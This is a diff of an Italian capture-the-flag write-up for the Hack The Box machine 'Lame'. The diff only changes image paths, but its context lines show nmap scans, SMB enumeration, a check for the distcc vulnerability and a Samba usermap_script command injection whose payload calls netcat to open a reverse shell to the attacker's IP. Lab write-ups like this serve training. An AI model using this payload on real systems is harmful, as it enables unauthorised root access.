@@ -20,11 +20,11 @@ Le porte aperte sono le seguenti:
 * **Porte 139 e 445:** Samba v3.0.20-Debian
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-1.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-1.png" />
 </p>
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-2.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-2.png" />
 </p>
 
 Prima di iniziare a lavorare su queste porte, lancio una scansione nmap più completa in background.
@@ -36,7 +36,7 @@ sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.3
 Di seguito il risultato della seconda scansione:
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-3.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-3.png" />
 </p>
 
 E' possibile notare la presenza di una nuova porta che non veniva mostrata nella scansione precedente.
@@ -57,7 +57,7 @@ Quando la backdoor viene attivata, la macchina di destinazione apre una shell su
 E' possibile controllare l'effettiva vulnerabilità mediante uno script nmap.
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-4.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-4.png" />
 </p>
 
 ```text
@@ -65,7 +65,7 @@ nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
 ```
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-5.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-5.png" />
 </p>
 
 Dall'output dello script capisco che non è possibile sfruttare questa vulnerabilità.
@@ -85,7 +85,7 @@ python openssh_4.7p1.py
 ```
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-8.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-8.png" />
 </p>
 
 Questa strada richiedeva troppo tempo e per questo motivo l'esecuzione dello script è stata interrotta.
@@ -107,7 +107,7 @@ Per ovviare a questo problema modifico il comando nel modo seguente:
 smbclient -L 10.10.10.3 --option='client min protocol=NT1'
 ```
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-6.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-6.png" />
 </p>
 
 **E' disponibile il login anonimo!**
@@ -123,7 +123,7 @@ smbmap -H 10.10.10.3
 Scopro di avere accesso di tipo READ/WRITE sulla cartella tmp.
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-7.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-7.png" />
 </p>
 
 Effettuando una ricerca veloce noto che questa versione del servizio è [vulnerabile](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html).
@@ -149,7 +149,7 @@ nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
 **E' vulnerabile!**
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-9.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-9.png" />
 </p>
 
 Quindi ho a disposizione due strade per cercare di bucare questa macchina.
@@ -179,7 +179,7 @@ logon "/=`nohup nc -nv 10.10.14.5 8080 -e /bin/sh`"
 **Ho ottenuto una shell dalla macchina lame con privilegi root!**
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-10.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-10.png" />
 </p>
 
 ### 2) Distcc
@@ -201,7 +201,7 @@ nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve20
 Questa volta non abbiamo una shell con privilegi root.
 
 <p align="center">
-  <img src="/immagini/immagini-macchine-linux/lame-10.png" />
+  <img src="/Immagini/Linux-Box/Lame/lame-10.png" />
 </p>
 
 Per ottenere i privilegi root provo con la vulnerabilità [CVE 2009–1185](https://www.exploit-db.com/exploits/8572).
